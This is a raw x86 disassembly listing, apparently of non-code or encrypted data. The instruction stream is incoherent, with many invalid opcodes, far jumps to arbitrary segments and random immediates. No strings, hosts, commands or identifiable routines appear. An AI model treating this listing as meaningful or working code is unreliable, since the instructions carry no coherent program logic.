  42c13d:	pop    es
  42c13e:	cmp    ebx,eax
  42c140:	pop    edi
  42c141:	or     cl,bh
  42c143:	clc    
  42c144:	inc    esi
  42c145:	(bad)  
  42c146:	fisub  DWORD PTR [eax]
  42c148:	pop    ecx
  42c149:	fbld   TBYTE PTR [ebx-0x1f]
  42c14c:	outs   dx,BYTE PTR ds:[esi]
  42c14d:	loop   0x42c193
  42c14f:	adc    eax,0x785aa2fc
  42c154:	(bad)  
  42c155:	stc    
  42c156:	mov    cl,0xe0
  42c158:	add    esp,DWORD PTR [edx]
  42c15a:	outs   dx,BYTE PTR ds:[esi]
  42c15b:	jns    0x42c15e
  42c15d:	mov    ah,0x96
  42c15f:	das    
  42c160:	popa   
  42c161:	call   0x57f70c3c
  42c166:	xchg   BYTE PTR [esp+ebx*4-0x15],al
  42c16a:	fsubrp st(6),st
  42c16c:	jge    0x42c170
  42c16e:	out    dx,eax
  42c16f:	mov    ah,0xdd
  42c171:	ins    BYTE PTR es:[edi],dx
  42c172:	mov    al,ds:0x97495c82
  42c177:	mov    eax,0x15b4e248
  42c17c:	call   0xa05e:0xf7d911cf
  42c183:	pop    ebp
  42c184:	iret   
  42c185:	pushf  
  42c186:	shl    DWORD PTR [edi],1
  42c188:	dec    esp
  42c189:	pop    edx
  42c18a:	cmc    
  42c18b:	data16 or BYTE PTR [eax+ecx*1+0x7f],ah
  42c190:	cwde   
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	xchg   DWORD PTR [edx+edi*1],esi
  42c203:	jmp    0x105:0x1d8e6
  42c20a:	add    BYTE PTR [eax],al
  42c20c:	iret   
  42c20d:	retf   0xa3a2
  42c210:	loopne 0x42c198
  42c212:	mov    cl,0x46
  42c214:	jb     0x42c1ac
  42c216:	pop    eax
  42c217:	jp     0x42c1c7
  42c219:	jge    0x42c29a
  42c21b:	(bad)  
  42c21c:	pop    ebp
  42c21d:	mov    esp,0x3f280e96
  42c222:	pushf  
  42c223:	pop    eax
  42c224:	bound  edi,QWORD PTR [edx-0xa0cef78]
  42c22a:	out    dx,eax
  42c22b:	out    dx,eax
  42c22c:	pushf  
  42c22d:	cwde   
  42c22e:	jo     0x42c248
  42c230:	jge    0x42c1df
  42c232:	das    
  42c233:	pop    esp
  42c234:	retf   0x296b
  42c237:	imul   ecx,DWORD PTR [ebx-0x6],0x7788b755
  42c23e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c23f:	stos   DWORD PTR es:[edi],eax
  42c240:	in     eax,0x5e
  42c242:	add    esi,esp
  42c244:	out    0x12,al
  42c246:	imul   ecx,DWORD PTR [edx+0x7536add7],0x87986320
  42c250:	push   ecx
  42c251:	xchg   DWORD PTR [esi-0x35],esi
  42c254:	inc    ecx
  42c255:	ins    DWORD PTR es:[edi],dx
  42c256:	push   cs
  42c257:	jmp    0x6133:0x55892e23
  42c25e:	xor    BYTE PTR [esi+0x35],0x96
  42c262:	push   0xc904eef5
  42c267:	ror    BYTE PTR es:[ebx],cl
  42c26a:	push   edi
  42c26b:	inc    edi
  42c26c:	loopne 0x42c28d
  42c26e:	aad    0x6c
  42c270:	out    dx,eax
  42c271:	lods   eax,DWORD PTR ds:[esi]
  42c272:	cs (bad) 
  42c274:	cld    
  42c275:	mov    dh,0xd4
  42c277:	mov    ebx,DWORD PTR [ebp-0x6f]
  42c27a:	test   al,0xf2
  42c27c:	push   esi
  42c27d:	sub    BYTE PTR [eax-0x7651d9a5],dh
  42c283:	inc    edx
  42c284:	inc    esi
  42c285:	out    dx,eax
  42c286:	cmp    edx,ecx
  42c288:	lock sbb ebx,esi
  42c28b:	jle    0x42c275
  42c28d:	sbb    BYTE PTR ds:0x9b8b767d,dl
  42c293:	jno    0x42c30e
  42c295:	push   edx
  42c296:	mov    ebp,0xcf9da3af
  42c29b:	inc    edx
  42c29c:	gs xchg edx,eax
  42c29e:	in     eax,0x77
  42c2a0:	and    al,al
  42c2a2:	adc    eax,0xbbb60fe9
  42c2a7:	mov    ebp,DWORD PTR ds:0x9e793011
  42c2ad:	jae    0x42c2c9
  42c2af:	test   BYTE PTR [edi+0x29],ah
  42c2b2:	shl    DWORD PTR [eax],0x79
  42c2b5:	loopne 0x42c295
  42c2b7:	(bad)  
  42c2b8:	xchg   ecx,eax
  42c2b9:	scas   al,BYTE PTR es:[edi]
  42c2ba:	loopne 0x42c247
  42c2bc:	push   edx
  42c2bd:	inc    esp
  42c2be:	mov    al,ds:0x6c517d92
  42c2c3:	in     eax,dx
  42c2c4:	clc    
  42c2c5:	cwde   
  42c2c6:	test   DWORD PTR [ebp+0x3e8271b0],0xc901c6b2
  42c2d0:	jmp    0xde85aafe
  42c2d5:	dec    ebp
  42c2d6:	aam    0x75
  42c2d8:	loopne 0x42c271
  42c2da:	push   ecx
  42c2db:	out    0xcb,al
  42c2dd:	in     eax,dx
  42c2de:	es push edx
  42c2e0:	daa    
  42c2e1:	adc    al,0xcb
  42c2e3:	lods   eax,DWORD PTR ds:[esi]
  42c2e4:	retf   0x5643
  42c2e7:	rcl    BYTE PTR [esi+0x19],0x1a
  42c2eb:	out    dx,al
  42c2ec:	push   ebx
  42c2ed:	and    edi,DWORD PTR [ebx-0x2b]
  42c2f0:	and    ebp,esi
  42c2f2:	cmp    BYTE PTR [esi],bl
  42c2f4:	jp     0x42c323
  42c2f6:	push   edi
  42c2f7:	inc    ebx
  42c2f8:	cmp    ebx,DWORD PTR [eax]
  42c2fa:	(bad)  
  42c2fc:	or     BYTE PTR [edx-0x54464f30],dl
  42c302:	outs   dx,BYTE PTR ds:[esi]
  42c303:	fidiv  WORD PTR [edi]
  42c305:	ins    BYTE PTR es:[edi],dx
  42c306:	add    edi,eax
  42c308:	push   ecx
  42c309:	jae    0x42c30c
  42c30b:	aad    0x4b
  42c30d:	cwde   
  42c30e:	retf   0xce30
	...
  42c371:	add    BYTE PTR [eax],al
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0x84ba6af6
  42c383:	xchg   esi,eax
  42c384:	jmp    0x42c35f
  42c386:	add    DWORD PTR [eax],eax
  42c388:	add    eax,0xdc000001
  42c38d:	xchg   esp,eax
  42c38e:	adc    al,0x9b
  42c390:	xor    DWORD PTR [eax-0x21ea7cbe],ebx
  42c396:	lahf   
  42c397:	sti    
  42c398:	iret   
  42c399:	into   
  42c39a:	arpl   si,di
  42c39c:	mov    esp,0xb5e0df6d
  42c3a1:	das    
  42c3a2:	sti    
  42c3a3:	enter  0x701f,0x2d
  42c3a7:	fidiv  WORD PTR [edx-0x37]
  42c3aa:	ja     0x42c3ef
  42c3ac:	mov    ecx,0x71f8f358
  42c3b1:	aad    0x96
  42c3b3:	outs   dx,BYTE PTR ds:[esi]
  42c3b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c3b5:	fild   WORD PTR [ebx+0x66]
  42c3b8:	(bad)
  42c3bb:	fwait
  42c3bc:	les    edi,FWORD PTR [esi]
  42c3be:	aaa    
  42c3bf:	test   DWORD PTR [ecx],ecx
  42c3c1:	mov    ah,0x85
  42c3c3:	retf   0x5971
  42c3c6:	jne    0x42c43c
  42c3c8:	(bad)  
  42c3c9:	fs pop ebp
  42c3cb:	mov    ecx,0x941b9fd5
  42c3d0:	add    ecx,DWORD PTR [edi+0x49ef4dc9]
  42c3d6:	je     0x42c407
  42c3d8:	lods   eax,DWORD PTR ds:[esi]
  42c3d9:	pop    esi
  42c3da:	test   al,0x88
  42c3dc:	into   
  42c3dd:	test   BYTE PTR [ecx],al
  42c3df:	ror    edi,0x77
  42c3e2:	xchg   ecx,eax
  42c3e3:	iret   
  42c3e4:	js     0x42c39c
  42c3e6:	jmp    0x9ce1:0xe352f8b4
  42c3ed:	dec    esp
  42c3ee:	ds js  0x42c3eb
  42c3f1:	retf   0x6415
  42c3f4:	push   ebx
  42c3f5:	addr16 add eax,0x9ba342
  42c3fb:	lods   al,BYTE PTR ds:[esi]
  42c3fc:	cli    
  42c3fd:	jo     0x42c40e
  42c3ff:	aaa    
  42c400:	xor    BYTE PTR [ecx],0x7a
  42c403:	loope  0x42c44c
  42c405:	rcr    DWORD PTR [edi-0x772f5f7f],0x5c
  42c40c:	mov    DWORD PTR [eax-0x5e03670a],ecx
  42c412:	test   DWORD PTR [eax],edi
  42c414:	rcr    ecx,0xdf
  42c417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c418:	in     eax,dx
  42c419:	pop    esp
  42c41a:	mov    ?,WORD PTR [edx-0x3b00a4dd]
  42c420:	adc    eax,0x4c410816
  42c425:	inc    edx
  42c426:	xchg   edi,eax
  42c427:	xlat   BYTE PTR ds:[ebx]
  42c428:	pop    ecx
  42c429:	fwait
  42c42a:	adc    al,0xf9
  42c42c:	out    0xc4,al
  42c42e:	cwde   
  42c42f:	push   eax
  42c430:	jmp    0xbfe9adc0
  42c435:	shr    DWORD PTR [ebp+0x2e],cl
  42c438:	adc    eax,0x3dd92bab
  42c43d:	cs push edx
  42c43f:	loope  0x42c40b
  42c441:	push   esi
  42c442:	jae    0x42c42b
  42c444:	jl     0x42c487
  42c446:	ss test eax,0x6fed4c6e
  42c44c:	adc    al,0x80
  42c44e:	xchg   edx,esp
  42c450:	lea    ecx,[edi-0x37]
  42c453:	jmp    0x64a1:0x57f587ea
  42c45a:	push   edx
  42c45b:	push   edi
  42c45c:	sub    bl,al
  42c45e:	inc    ebp
  42c45f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c460:	test   DWORD PTR [esi],edx
  42c462:	int3   
  42c463:	add    ebp,DWORD PTR [edi+0x2f574b0]
  42c469:	jge    0x42c3f0
  42c46b:	call   0x3a7f4a55
  42c470:	sbb    DWORD PTR [ebp-0x6d],esi
  42c473:	jge    0x42c426
  42c475:	fmul   DWORD PTR [esi]
  42c477:	out    dx,al
  42c478:	add    DWORD PTR [ecx],edi
  42c47a:	in     eax,dx
  42c47b:	(bad)  
  42c47c:	or     DWORD PTR [eax+ebp*4],esi
  42c47f:	sti    
  42c480:	xchg   esp,eax
  42c481:	scas   eax,DWORD PTR es:[edi]
  42c482:	fldcw  WORD PTR [ecx]
  42c484:	add    esi,edx
  42c486:	cld    
  42c487:	dec    ebp
  42c488:	push   ss
  42c489:	jno    0x42c4da
  42c48b:	mov    BYTE PTR [esi-0x7fa01244],bh
	...
  42c4f1:	add    BYTE PTR [eax],al
  42c4f3:	add    ah,ch
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0xe234,0xc6
  42c502:	out    0xcf,al
  42c504:	lock fiadd DWORD PTR [ecx]
  42c507:	add    BYTE PTR ds:0xff000001,al
  42c50d:	add    dh,BYTE PTR [ebx+0x76eec3fb]
  42c513:	dec    ebx
  42c514:	and    cl,al
  42c516:	cmp    dl,BYTE PTR [ebp+ebp*2+0xa]
  42c51a:	imul   esp,DWORD PTR ds:0xf8ed1f8e,0x5c
  42c521:	lahf   
  42c522:	mov    eax,ds:0xce1d513c
  42c527:	xor    al,0x9f
  42c529:	aad    0xf0
  42c52b:	fst    QWORD PTR [eax+0x39498233]
  42c531:	xlat   BYTE PTR ds:[ebx]
  42c532:	jp     0x42c58a
  42c534:	push   cs
  42c535:	pop    ebx
  42c536:	aas    
  42c537:	imul   edi,ebp,0xc951e4ea
  42c53d:	aam    0xa6
  42c53f:	test   al,0x3d
  42c541:	ret    
  42c542:	inc    ebp
  42c543:	ins    BYTE PTR es:[edi],dx
  42c544:	lods   al,BYTE PTR ds:[esi]
  42c545:	jmp    0x51863397
  42c54a:	jg     0x42c54e
  42c54c:	dec    edi
  42c54d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c54e:	add    BYTE PTR [edx+ecx*1+0x27],0x2c
  42c553:	std    
  42c554:	mov    ds:0x80e861ce,al
  42c559:	mov    eax,0xf8a72677
  42c55e:	cmc    
  42c55f:	fdivr  DWORD PTR [esi+eiz*1-0xdfa5fcd]
  42c566:	ss pusha 
  42c568:	jb     0x42c533
  42c56a:	pop    eax
  42c56b:	mov    dh,0x62
  42c56d:	sub    bl,BYTE PTR [esi-0x576aceb9]
  42c573:	mov    ebp,0x6873510e
  42c578:	adc    al,0x8d
  42c57a:	retf   0xa11b
  42c57d:	pop    ds
  42c57e:	inc    edx
  42c57f:	fisub  DWORD PTR [ecx-0x39]
  42c582:	and    BYTE PTR [ebp+0x42eccc76],ah
  42c588:	cs jb  0x42c537
  42c58b:	inc    ebx
  42c58c:	mov    ds:0xbefd5a77,eax
  42c591:	bound  edx,QWORD PTR [edx]
  42c593:	pop    es
  42c594:	fs into 
  42c596:	mov    dl,0x5e
  42c598:	inc    eax
  42c599:	loope  0x42c590
  42c59b:	out    dx,eax
  42c59c:	outs   dx,BYTE PTR ds:[esi]
  42c59d:	repz ficom WORD PTR [ecx-0x39]
  42c5a1:	xor    esi,DWORD PTR [esi-0x5a34a579]
  42c5a7:	sub    al,0xf1
  42c5a9:	pop    eax
  42c5aa:	lahf   
  42c5ab:	push   edx
  42c5ac:	ins    DWORD PTR es:[edi],dx
  42c5ad:	xchg   ecx,eax
  42c5ae:	icebp  
  42c5af:	outs   dx,BYTE PTR ds:[esi]
  42c5b0:	mov    eax,ds:0xeeb094d9
  42c5b5:	lods   al,BYTE PTR ds:[esi]
  42c5b6:	nop
  42c5b7:	sbb    DWORD PTR [edx-0x4e],esi
  42c5ba:	jbe    0x42c598
  42c5bc:	das    
  42c5bd:	leave  
  42c5be:	fisubr WORD PTR [edx+0x6ba4cb2c]
  42c5c4:	int    0x75
  42c5c6:	aaa    
  42c5c7:	adc    al,0x28
  42c5c9:	enter  0x7737,0x89
  42c5cd:	sub    ebp,esi
  42c5cf:	adc    eax,0x936e1185
  42c5d4:	cld    
  42c5d5:	mov    eax,DWORD PTR [edx]
  42c5d7:	cmp    BYTE PTR [edx-0x69a2a410],bl
  42c5dd:	mov    cx,0x8de0
  42c5e1:	fs (bad) 
  42c5e3:	imul   edi,ecx,0x2a84b7e2
  42c5e9:	ret    0x8ef2
  42c5ec:	sbb    eax,0xed301072
  42c5f1:	lods   al,BYTE PTR ds:[esi]
  42c5f2:	dec    edx
  42c5f3:	ja     0x42c62d
  42c5f5:	icebp  
  42c5f6:	je     0x42c5cb
  42c5f8:	push   esi
  42c5f9:	out    0x94,al
  42c5fb:	xchg   bl,al
  42c5fd:	adc    DWORD PTR [ebx+0x1c],esi
  42c600:	lds    ebp,FWORD PTR [ebp+0x1cc044ed]
  42c606:	xor    al,0xa0
  42c608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c609:	cld    
  42c60a:	mov    bh,0xb1
  42c60c:	sbb    al,0x83
  42c60e:	add    al,0x42
  42c610:	fiadd  DWORD PTR [eax]
	...
  42c672:	add    BYTE PTR [eax],al
  42c674:	pop    ebp
  42c675:	dec    eax
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx+0x76dfc6b]
  42c681:	imul   edx,DWORD PTR [ebp+0x1dbf596],0x10500
  42c68b:	add    BYTE PTR [ecx+0x5921a68],al
  42c691:	xor    eax,0x91f0252f
  42c696:	ins    BYTE PTR es:[edi],dx
  42c697:	and    dh,BYTE PTR [edi-0x4e]
  42c69a:	fisub  DWORD PTR [ecx+0xe]
  42c69d:	push   ds
  42c69e:	push   ecx
  42c69f:	xor    ecx,ecx
  42c6a1:	into   
  42c6a2:	(bad)  [edi]
  42c6a4:	inc    esp
  42c6a5:	dec    ecx
  42c6a6:	int    0x4d
  42c6a8:	lods   eax,DWORD PTR ds:[esi]
  42c6a9:	dec    esi
  42c6aa:	cmc    
  42c6ab:	sub    BYTE PTR [eax],0x4c
  42c6ae:	fisub  WORD PTR [ebx]
  42c6b0:	xchg   esp,eax
  42c6b1:	call   0xca9c793d
  42c6b6:	jge    0x42c728
  42c6b8:	add    ebp,DWORD PTR [ebx]
  42c6ba:	(bad)  
  42c6bb:	fmul   DWORD PTR [edi-0x33af81fa]
  42c6c1:	adc    BYTE PTR [ebx],bl
  42c6c3:	jb     0x42c70e
  42c6c5:	loope  0x42c69a
  42c6c7:	loope  0x42c715
  42c6c9:	sbb    BYTE PTR [edi+0x48],cl
  42c6cc:	mov    ah,BYTE PTR [edi]
  42c6ce:	push   edi
  42c6cf:	lock out 0x38,eax
  42c6d2:	bound  esp,QWORD PTR [edx-0x1530d88e]
  42c6d8:	sub    DWORD PTR [esi+0x60],ecx
  42c6db:	add    BYTE PTR [ecx+ebp*2-0x7e37ba01],cl
  42c6e2:	jp     0x42c6d0
  42c6e4:	adc    eax,0xea6f6438
  42c6e9:	out    dx,eax
  42c6ea:	loope  0x42c6b9
  42c6ec:	cli    
  42c6ed:	sub    ecx,DWORD PTR [ebx+0x2eae1e9b]
  42c6f3:	out    dx,eax
  42c6f4:	add    bh,BYTE PTR [edi-0x5781191d]
  42c6fa:	retf   0x4a5d
  42c6fd:	pop    esi
  42c6fe:	sahf   
  42c6ff:	(bad)  
  42c700:	loope  0x42c762
  42c702:	jns    0x42c73e
  42c704:	cmc    
  42c705:	sbb    BYTE PTR [edi-0x39157f8b],cl
  42c70b:	fincstp 
  42c70d:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c70f:	sbb    DWORD PTR [ebx],edx
  42c711:	xor    BYTE PTR [esi+0x3db49bc7],cl
  42c717:	retf   0x3e2
  42c71a:	xor    esp,ecx
  42c71c:	push   edi
  42c71d:	or     BYTE PTR [edx],bh
  42c71f:	jbe    0x42c782
  42c721:	or     ebp,DWORD PTR [ecx-0x1f48ee01]
  42c727:	aas    
  42c728:	adc    ebx,DWORD PTR [edi]
  42c72a:	or     DWORD PTR [edx],ebx
  42c72c:	out    dx,al
  42c72d:	test   DWORD PTR [eax+0x4849cf9a],ebp
  42c733:	push   es
  42c734:	jp     0x42c790
  42c736:	mov    edi,0xfb67a2f1
  42c73b:	mov    al,ds:0xf1a88fc0
  42c740:	mov    cl,al
  42c742:	mov    DWORD PTR [edi-0x524a66e9],0x1da52dcb
  42c74c:	les    esp,FWORD PTR [ebp+0x37]
  42c74f:	xor    ch,dl
  42c751:	(bad)  
  42c752:	fwait
  42c753:	ins    BYTE PTR es:[edi],dx
  42c754:	repz fld DWORD PTR [edx+0x8d5daa6]
  42c75b:	imul   edx,DWORD PTR [ebp+0x16cbdda6],0xe1c2925a
  42c765:	mov    eax,0x3c5ea7cc
  42c76a:	sub    DWORD PTR [ebx-0x35c47583],ebp
  42c770:	mov    ch,0x6a
  42c772:	jmp    0x4611:0x259f930f
  42c779:	aaa    
  42c77a:	inc    ebp
  42c77b:	addr16 push esi
  42c77d:	mov    gs,WORD PTR [ebp-0x53a4e413]
  42c783:	ret    
  42c784:	push   edi
  42c785:	in     al,dx
  42c786:	(bad)  
  42c787:	dec    esp
  42c788:	dec    esp
  42c789:	jbe    0x42c7e6
  42c78b:	in     eax,dx
  42c78c:	sub    eax,0x4afbf186
	...
  42c7f1:	add    BYTE PTR [eax],al
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0xabcba40e
  42c802:	jg     0x42c83d
  42c804:	cli    
  42c805:	fadd   QWORD PTR [ecx]
  42c807:	add    BYTE PTR ds:0x51000001,al
  42c80d:	loope  0x42c864
  42c80f:	mov    ah,0x15
  42c811:	pop    ebx
  42c812:	scas   al,BYTE PTR es:[edi]
  42c813:	daa    
  42c814:	xchg   DWORD PTR [eax],edx
  42c816:	outs   dx,DWORD PTR ds:[esi]
  42c817:	rcl    bh,cl
  42c819:	or     eax,0xb207c81f
  42c81e:	in     eax,dx
  42c81f:	jecxz  0x42c7aa
  42c821:	out    dx,al
  42c822:	pushf  
  42c823:	mov    ebx,0xc3d76f02
  42c828:	(bad)  
  42c829:	xchg   edx,eax
  42c82a:	aad    0x94
  42c82c:	lods   eax,DWORD PTR ds:[esi]
  42c82d:	outs   dx,BYTE PTR ds:[esi]
  42c82e:	or     dh,ch
  42c830:	adc    eax,0x1f1318da
  42c835:	std    
  42c836:	jae    0x42c7f5
  42c838:	push   0xffffffa5
  42c83a:	push   esp
  42c83b:	xor    al,0x4d
  42c83d:	push   edx
  42c83e:	inc    edi
  42c83f:	(bad)  
  42c840:	xor    al,0xef
  42c842:	retf   0xb5c3
  42c845:	bound  edi,QWORD PTR [ebx-0x69614d8d]
  42c84b:	xor    eax,0x8bd1df18
  42c850:	xchg   ecx,eax
  42c851:	xchg   edi,eax
  42c852:	xchg   esp,eax
  42c853:	push   esi
  42c854:	arpl   WORD PTR [esi-0x29d017e4],cx
  42c85a:	stos   DWORD PTR es:[edi],eax
  42c85b:	(bad)  
  42c85c:	in     eax,dx
  42c85d:	fistp  WORD PTR [ebx+esi*1]
  42c860:	jg     0x42c824
  42c862:	test   al,0x8e
  42c864:	lds    edi,FWORD PTR [ebx-0x195ce85b]
  42c86a:	push   ss
  42c86b:	aaa    
  42c86c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c86d:	or     ah,BYTE PTR [edx+0x6e95cef1]
  42c873:	jmp    0x4117192a
  42c878:	cmp    DWORD PTR [edx],0x95a4ce48
  42c87e:	cwde   
  42c87f:	push   ebp
  42c880:	leave  
  42c881:	mov    cl,BYTE PTR [edx+0x6b984363]
  42c887:	sbb    eax,0x84478798
  42c88c:	mov    al,BYTE PTR [eax]
  42c88e:	jne    0x42c84c
  42c890:	xlat   BYTE PTR ds:[ebx]
  42c891:	push   0xffffffcb
  42c893:	(bad)  
  42c894:	and    eax,DWORD PTR [edi-0x5b]
  42c897:	cdq    
  42c898:	lock stos DWORD PTR es:[edi],eax
  42c89a:	mov    edi,0x765d509f
  42c89f:	mov    bh,0x4a
  42c8a1:	mov    ebx,0x8101009a
  42c8a6:	pushf  
  42c8a7:	xor    al,0xc9
  42c8a9:	(bad)  
  42c8aa:	adc    DWORD PTR [ecx-0x41],ecx
  42c8ad:	cmp    BYTE PTR cs:0x2efad4ba,bh
  42c8b4:	(bad)  
  42c8b5:	fcom   QWORD PTR [ebp-0x24]
  42c8b8:	mov    esp,0x681760ab
  42c8bd:	push   ds
  42c8be:	lds    esp,FWORD PTR [ecx-0xe5d089]
  42c8c4:	fsub   st,st(6)
  42c8c6:	fs xchg esi,eax
  42c8c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8c9:	and    al,al
  42c8cb:	inc    edx
  42c8cc:	xor    DWORD PTR [edi+0xb3dd580],0x47
  42c8d3:	sub    eax,0x80933667
  42c8d8:	in     al,dx
  42c8d9:	mov    bh,0xf8
  42c8db:	push   ebp
  42c8dc:	imul   esp,DWORD PTR [eax+0x18e9b2de],0x48
  42c8e3:	jbe    0x42c8a3
  42c8e5:	add    dl,BYTE PTR [edx+0x912105]
  42c8eb:	ror    DWORD PTR [esi+0x3b],cl
  42c8ee:	dec    edi
  42c8ef:	jmp    0x711:0x3f22dced
  42c8f6:	call   0xc78291d5
  42c8fb:	xor    sp,bp
  42c8fe:	(bad)  
  42c8ff:	shl    dh,cl
  42c901:	aaa    
  42c902:	add    BYTE PTR [eax+0x4c],ah
  42c905:	xor    dh,BYTE PTR [esi]
  42c907:	cmp    BYTE PTR [ecx],ch
  42c909:	push   es
  42c90a:	mov    edx,?
  42c90c:	inc    ebx
  42c90d:	mov    eax,0xd36dd0
	...
  42c972:	add    BYTE PTR [eax],al
  42c974:	adc    BYTE PTR [ebx],bl
  42c976:	leave  
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x151a4b33
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0x86000001,al
  42c98d:	inc    edx
  42c98e:	lea    esi,[edx+0x43]
  42c991:	data16 jae 0x42c949
  42c994:	cs mov ebp,0xd99df71b
  42c99a:	adc    esi,DWORD PTR [edx]
  42c99c:	sub    eax,0x2dc2c420
  42c9a1:	mov    edx,0xd2eaada1
  42c9a6:	add    DWORD PTR [ecx-0x6bd0c46c],ebp
  42c9ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c9ad:	sbb    cl,ah
  42c9af:	test   eax,0x72ea9e6d
  42c9b4:	push   ecx
  42c9b5:	in     al,dx
  42c9b6:	out    dx,al
  42c9b7:	push   0x15
  42c9b9:	dec    DWORD PTR [eax-0x2958a810]
  42c9bf:	push   cs
  42c9c0:	mov    DWORD PTR [ebx+0x23],0xb1cfa6d0
  42c9c7:	pop    ebx
  42c9c8:	xchg   DWORD PTR [ebp-0x37d19832],edi
  42c9ce:	lea    ebp,[ebx+0x9]
  42c9d1:	or     ebp,DWORD PTR [edi-0x46]
  42c9d4:	out    dx,al
  42c9d5:	inc    edi
  42c9d6:	or     ch,BYTE PTR [ebp+0x28]
  42c9d9:	inc    esi
  42c9da:	xor    al,0x72
  42c9dc:	xlat   BYTE PTR ds:[ebx]
  42c9dd:	push   eax
  42c9de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c9df:	mov    edx,0xf1766b8
  42c9e4:	addr16 pop esi
  42c9e6:	in     al,dx
  42c9e7:	pop    edx
  42c9e8:	mov    eax,0xaf3a75f2
  42c9ed:	jmp    0xc3b82116
  42c9f2:	unpcklps xmm2,xmm2
  42c9f5:	scas   al,BYTE PTR es:[edi]
  42c9f6:	aad    0x87
  42c9f8:	sbb    edi,DWORD PTR [edi+esi*2-0x44]
  42c9fc:	or     ch,BYTE PTR [ebx-0x11]
  42c9ff:	and    ch,BYTE PTR [edx-0x77]
  42ca02:	push   esp
  42ca03:	mov    dl,0xb6
  42ca05:	retf   
  42ca06:	xor    eax,0xa6002c
  42ca0b:	push   ecx
  42ca0c:	push   ebp
  42ca0d:	xor    eax,DWORD PTR [edi+0x3ae481e7]
  42ca13:	leave  
  42ca14:	dec    esp
  42ca15:	inc    esi
  42ca16:	mov    ecx,0x27641f91
  42ca1b:	fdivp  st(1),st
  42ca1d:	dec    esp
  42ca1e:	test   BYTE PTR [eax],ah
  42ca20:	sub    al,0x72
  42ca22:	jo     0x42c9ca
  42ca24:	pop    edi
  42ca25:	imul   edi,DWORD PTR [edi-0x65247246],0x67
  42ca2c:	clc    
  42ca2d:	mov    ds:0xbc655cb3,al
  42ca32:	nop
  42ca33:	and    DWORD PTR [eax-0x59c0f1b3],ecx
  42ca39:	mov    ah,0x14
  42ca3b:	dec    esp
  42ca3c:	pop    esp
  42ca3d:	outs   dx,BYTE PTR ds:[esi]
  42ca3e:	idiv   bh
  42ca40:	cld    
  42ca41:	daa    
  42ca42:	and    al,bl
  42ca44:	mov    bl,0xaf
  42ca46:	dec    eax
  42ca48:	cmp    DWORD PTR [ebp+0x50],ecx
  42ca4b:	or     eax,0xe91faf73
  42ca50:	push   cs
  42ca51:	test   BYTE PTR ds:0x3dba44a,bl
  42ca57:	scas   al,BYTE PTR es:[edi]
  42ca58:	js     0x42ca09
  42ca5a:	rcl    DWORD PTR [edi+0x3c],0xe6
  42ca5e:	mov    ds:0xb8afa1,eax
  42ca63:	dec    eax
  42ca64:	and    DWORD PTR [eax-0x5b],ebx
  42ca67:	push   0xffffffb2
  42ca69:	popa   
  42ca6a:	clc    
  42ca6b:	jl     0x42cae5
  42ca6d:	xchg   DWORD PTR [eax],edi
  42ca6f:	idiv   DWORD PTR [edi]
  42ca71:	daa    
  42ca72:	out    dx,eax
  42ca73:	sub    DWORD PTR [ebp+0x2a],ebx
  42ca76:	sti    
  42ca77:	inc    edi
  42ca78:	into   
  42ca79:	adc    BYTE PTR [esi+0x1f],ch
  42ca7c:	adc    BYTE PTR [edi],cl
  42ca7e:	clc    
  42ca7f:	ja     0x42ca02
  42ca81:	imul   bh
  42ca83:	and    al,0x69
  42ca85:	es add al,0xf1
  42ca88:	outs   dx,BYTE PTR ds:[esi]
  42ca89:	pop    edi
  42ca8a:	jl     0x42cac8
  42ca8c:	and    BYTE PTR [eax+edi*4],dl
  42ca8f:	sbb    BYTE PTR [esi],0x0
	...
  42caf2:	add    BYTE PTR [eax],al
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0x5dd46ec0]
  42cb02:	push   ss
  42cb03:	cmp    DWORD PTR [edi+ebx*8],eax
  42cb06:	add    DWORD PTR [eax],eax
  42cb08:	add    eax,0x6a000001
  42cb0d:	hlt    
  42cb0e:	dec    esp
  42cb0f:	in     eax,dx
  42cb10:	mov    eax,ds:0x94a77953
  42cb15:	push   es
  42cb16:	bound  ebp,QWORD PTR [edx-0x18]
  42cb19:	adc    BYTE PTR [ebp-0xc],cl
  42cb1c:	cmp    eax,0x86f82520
  42cb21:	sti    
  42cb22:	lods   al,BYTE PTR ds:[esi]
